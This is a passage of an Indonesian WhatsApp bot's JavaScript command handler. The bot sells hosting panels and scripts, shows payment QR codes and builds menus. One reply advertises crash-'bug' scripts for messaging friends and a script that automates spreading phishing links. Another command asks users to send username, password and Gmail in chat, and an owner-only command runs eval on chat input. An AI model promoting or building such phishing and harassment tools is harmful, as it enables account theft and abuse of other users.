📮 Unli GB Unli% CPU 40k 1BULAN

KEUNTUNGAN
• TIDAK BOROS KOUTA & MEMORI
• BISA RUN 24 JAM
• WEBSITE DI CLOSE BOT TETAP JALAN

PROSES 1-2 MENIT
PEMBAYARAN LEWAT
VIA DANA, QRISH, GOPAY`
var buttonMessage = {
text: menu_nya,
footer: footer_nya,
mentions: [sender],
buttons: [
{ buttonId: 'pay', buttonText: {displayText: 'PEMBAYARAN'}, type: 1}
],
headerType: 1
}
zassxd.sendMessage(from, buttonMessage)
}
break
        
case "promo":
{
m.reply(`*BERIKUT PROMO PANEL*
1GB-5GB 8K
6GB-UNLI GB 15K`)
}
break
        

case 'orkut' :
zassxd.sendMessage(from, { image: {url : "https://telegra.ph/file/cdf528c30957c94aa6bd6.jpg"}, caption: "Silahkan Scan QR OrderKuota Diatas Jangan Lupa Kirim Bukti Transaksinya Ya" }, { quoted: zassxd.chat })
break
        
case 'dana' :
zassxd.sendMessage(from, { image:{url : "https://telegra.ph/file/a55d5eb231e31e0205271.jpg"}, caption: "Silahkan Scan Code Qr Diatas Jangan Lupa Kirim Bukti Transaksinya Ke wa.me/6285876501859" }, { quoted: zassxd.chat })
break
        
case 'gopay': case 'gojek' :
zassxd.sendMessage(from, { image: {url : "https://telegra.ph/file/0b5571f31ea3cea680dad.jpg"}, caption: "Silahkan Scan Code Qr Diatas Jangan Lupa Kirim Bukti Transaksinya Ke wa.me/6285876501859" }, { quoted: zassxd.chat })
break
        
case 'qrish': case 'qr': case 'qris' :
zassxd.sendMessage(from, { image: {url : "https://telegra.ph/file/46b61b43ae9b617458169.jpg"}, caption: "Silahkan Scan Code Qr Diatas +1K Jangan Lupa Kirim Bukti Transaksinya Ya" }, { quoted: zassxd.chat })
break

case 'fbku': case 'facebookku' : {
m.reply(`Hai Kak, Berikut Akun Facebook Ku 👇👇\n(Link fb Lu)`)
}
break

case 'igku': case 'Instagram' : {
m.reply(`Hai Kak, Berikut Akun Instagram Ku 👇👇\n(Link Ig Lu)`)
}
break

case "i1":
{
m.reply(`*HARAP DI ISI TERLEBIH DAHULU*

TANGAL PEMBELIAN :
RAM YG DI BELI :
SS BUKTI TRANSFER`)
}
break

case "isi":
{
await
m.reply(`HARAP SALIN DAN ISI DATA DI BAWAH`)
await
m.reply(`user,pass,gmail`)
await
m.reply(`JANGAN LUPA PAKAI KOMA ,`)
}
break

case "untungsc":
{
m.reply(`
*SC BOT BUG*
Keuntungan :
Bisa open murid bug / iseng send bug ke temen

*SC 600+ FITURE*
Keuntungan :
Bisa open sewabot 

*SC BOT HOSTING*
Keutungan : 
gak cape” create akun whm

*SC AUTO RESS*
Keuntungan :
Bisa open jasteb, gak cape” nebar link phising🗿 ress? Gausa tanya lg,, deres bat`)
}
break

case 'done': case '*done*': {
m.reply(`*SUCCESSFULLY* ✅\nJangan Lupa Di Perpanjang Ya Kak 😃\n\nPanel RizkyEditz`)
}
break
        case 'sc': case 'script': {
            m.reply(`\nHai Kak, Kepengin Sc Create Panel RizkyEditz?\nSamperin Aja YT *RizkyEditz* Ada Disitu️`)
            }
        break

case "menu": case "help":
zassxd.sendMessage(from, { image:{url : "https://telegra.ph/file/5b8725701db1d23776ad1.jpg"}, caption: "Hai Kak\n\nSaya Adalah Bot WhatsApp Jual Beli Panel.\nKetik #panel Untuk Melihat List Harga Panel Ku Dan Ketik #list Untuk Melihat List Menu Saya!!\n*Script Bot Ini :*\nyoutube.com/@DS-fq1ij" }, { quoted: zassxd.chat })
break

case 'list': case 'listmenu': {
    let _uptime = process.uptime() * 1000
    let uptime = clockString(_uptime)
    let time = require('moment-timezone').tz('Asia/Jakarta').format('HH:mm:ss')
    let ar = ['list', 'menu']
    let title = `*沈BOT COLONGAN䆮*`
    let tmb = `LIST MENU`
    const sections = [ {
	title: `Sekarang Jam ${time} WIB || YT : RizkyEditz`,
	rows: [
        {title: `😎ALL MENU😴`, rowId: `allmenu`,description: 'All List Menu'},
        {title: `👻WEBSITE🥱`, rowId: `web`,description: 'Website Kak RizkyEditz'},
        {title: `😅LINK PANEL😘`, rowId: `llog`,description: 'Link Login Panel'},
        {title: `🤣Pembayaran😭`, rowId: `payment`,description: 'Bayar Panel Disini'},
        {title: `️🙂OWNER MENU🙃️`, rowId: `ownermenu`,description: 'Hanya Bisa Di Gunakan Oleh RizkyEditz'},
        {title: `😶GROUP MENU🤔`, rowId: `groupmenu`,description: 'Hanya Bisa Di Gunakan Dalam Gc'},
        {title: `🤪STORE MENU🤪`, rowId: `store`,description: 'List Store'},
        ]
 }] 

const listMessage = {
  text: title,
  mentions: [m.sender],
  footer: '*HAI KAK SILAHKAN PILIH LIST MENU DI BAWAH YAH*',
  buttonText: tmb,
  sections
}

  if(!text) return zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!ar.includes(text)) throw zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!res.ok) throw `${res.status} ${res.statusText}`
  let json = await res.json()
  if (!json.image) throw json
}
break

case 'sosmed': case 'web': case 'website': {
    let _uptime = process.uptime() * 1000
    let uptime = clockString(_uptime)
    let time = require('moment-timezone').tz('Asia/Jakarta').format('HH:mm:ss')
    let ar = ['list', 'menu']
    let title = `*沈RizkyEditz䆮*`
    let tmb = `KLIK HERE`
    const sections = [ {
	title: `Aktif Selama ${uptime} || Waktu ${time} WIB`,
	rows: [
        {title: ` YouTube `, rowId: `.ytku`},
        {title: ` Instagram `, rowId: `.igku`},
        {title: ` Facebook `, rowId: `.fbku`},
        {title: ` Tiktok `, rowId: `.ttku`},
        ]
 } ]

const listMessage = {
  text: title,
  mentions: [m.sender],
  footer: '*HAI KAK BERIKUT ADALAH WESITE RESMI SAYA*',
  buttonText: tmb,
  sections
}

  if(!text) return zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!ar.includes(text)) throw zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!res.ok) throw `${res.status} ${res.statusText}`
  let json = await res.json()
  if (!json.image) throw json
}
break
        
case 'pay': case 'payment': case 'bayar': {
    let _uptime = process.uptime() * 1000
    let uptime = clockString(_uptime)
    let time = require('moment-timezone').tz('Asia/Jakarta').format('HH:mm:ss')
    let ar = ['list', 'menu']
    let title = `*沈BOT COLONGAN䆮*`
    let tmb = `PAYMENT六`
    const sections = [ {
	title: `Aktif Selama ${uptime} || Waktu ${time} WIB`,
	rows: [
        {title: `QRISH✅`, rowId: `.qrish`},
        {title: `GOPAY✅`, rowId: `.gopay`},
        {title: `DANA✅`, rowId: `.dana`},
        {title: `ORDER KUOTA✅`, rowId: `.orkut`},
        ]
 } ]

const listMessage = {
  text: title,
  mentions: [m.sender],
  footer: '📮 *SILAHKAN PILIH PEMBAYARAN DIBAWAH*',
  buttonText: tmb,
  sections
}

  if(!text) return zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!ar.includes(text)) throw zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!res.ok) throw `${res.status} ${res.statusText}`
  let json = await res.json()
  if (!json.image) throw json
}
break
        
case 'store': {
    let _uptime = process.uptime() * 1000
    let uptime = clockString(_uptime)
    let time = require('moment-timezone').tz('Asia/Jakarta').format('HH:mm:ss')
    let ar = ['list', 'menu']
    let title = `*沈RizkyEditz䆮*`
    let tmb = `ALL LIST六`
    const sections = [ {
	title: `Aktif Selama ${uptime} || Waktu ${time} WIB`,
	rows: [
        {title: `list panel✅`, rowId: `.buypanel`, description: 'PEMBELIAN PANEL'},
        {title: `buysc✅`, rowId: `.buysc`, description: 'PEMBELIAN SCRIPT'},
        {title: `jasarun✅`, rowId: `jasarun`, description: 'RUNING BOTZ'},
        {title: `pembuatan panel✅`, rowId: `pembuatanpanel`, description: 'CREATE SERVER'},
{title: `LIST VPS✅`, rowId: `buyvps`, description: 'VPS LINUX/UBUNTU'}, 
        ]
 } ]

const listMessage = {
  text: title,
  mentions: [m.sender],
  footer: '📮 *SILAHKAN PILIH LIST STORE KAMI*',
  buttonText: tmb,
  sections
}

  if(!text) return zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!ar.includes(text)) throw zassxd.sendMessage(m.chat, listMessage, { quoted: m })
  if (!res.ok) throw `${res.status} ${res.statusText}`
  let json = await res.json()
  if (!json.image) throw json
}
break
        
default:
}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus RizkyEditz`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})